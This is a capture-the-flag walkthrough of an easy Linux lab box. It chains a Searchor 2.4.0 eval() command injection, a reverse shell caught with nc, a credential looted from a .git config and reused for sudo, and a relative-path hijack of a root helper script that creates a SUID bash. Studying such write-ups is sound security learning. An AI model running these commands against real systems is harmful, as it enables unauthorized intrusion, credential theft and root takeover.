#Linux #Python #CMDInjection #git #gitea #credentialhunting #docker #sudo

## Overview

Busqueda is an easy Linux box that flows from a command-injection RCE in a Python web app to a tidy `sudo` privilege escalation by way of credential reuse and a Docker-aware helper script. The foothold is **CVE-2023-43364** in Searchor 2.4.0; the root comes from a sudo-runnable script that I can both *inspect* (after looting Gitea) and *hijack* via a relative-path bug.

## Recon

The site redirects to a vhost, added to hosts, and presents a Flask app branded **Searchor 2.4.0**.

## Foothold

### Searchor 2.4.0 Command Injection

> **Why it's vulnerable:** Searchor built its search URL by passing user input into Python's `eval()`. Anything you type is evaluated as Python, so a crafted query breaks out into `os.system(...)`. User-controlled `eval` is one of the most direct RCE primitives there is.

```sh
python3 searchor-2_4_0_RCE.py searcher.htb 10.10.14.92 53
```

```sh
rlwrap nc -lvnp 53
whoami
svc
```

## Privilege Escalation

### Credentials in a .git Config

The web root held a `.git` directory. Git remotes often embed credentials, and this one did:

```sh
cat /var/www/app/.git/config
[remote "origin"]
    url = http://cody:‹redacted›@gitea.searcher.htb/cody/Searcher_site.git
```

> **Why this is a privesc lead, not just a Gitea login:** the password was useful far beyond Gitea. I tested it against `sudo` for the `svc` account, and password reuse paid off:

```sh
sudo -l
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

### Abusing system-checkup.py

I couldn't read the script's source, but running it with a bogus argument leaked its usage:

```
docker-ps      : List running docker containers
docker-inspect : Inspect a certain docker container
full-checkup   : Run a full system checkup
```

`docker-inspect` passes a format string to `docker inspect`, so I dumped a container's full config as JSON and found the Gitea DB credentials in its environment:

```sh
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
"GITEA__database__PASSWD=‹redacted›"
```

That password unlocked the Gitea **administrator** account (reuse again), which gave me read access to the `system-checkup.py` source. There the `full-checkup` action revealed the real flaw:

```python
elif action == 'full-checkup':
    arg_list = ['./full-checkup.sh']   # relative path!
```

> **The bug:** the script calls `./full-checkup.sh` by *relative* path. Since I control the working directory when I invoke it, I can drop my own `full-checkup.sh` in `/tmp` and run the sudo command from there, root then executes my script.

```sh
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /tmp/full-checkup.sh
cd /tmp && sudo python3 /opt/scripts/system-checkup.py full-checkup
```

## Root

The SUID `rootbash` drops a root shell:

```sh
/tmp/rootbash -p
rootbash-5.1# whoami
root
```

## Takeaways

- **`eval()` on user input = RCE.** Searchor 2.4.0 is a clean example.
- **Password reuse is the connective tissue here.** One looted git password unlocked `sudo`, Gitea admin, and ultimately the script source.
- **Relative paths in root scripts are hijackable.** Control the CWD, plant the named file, and the privileged process runs your code.
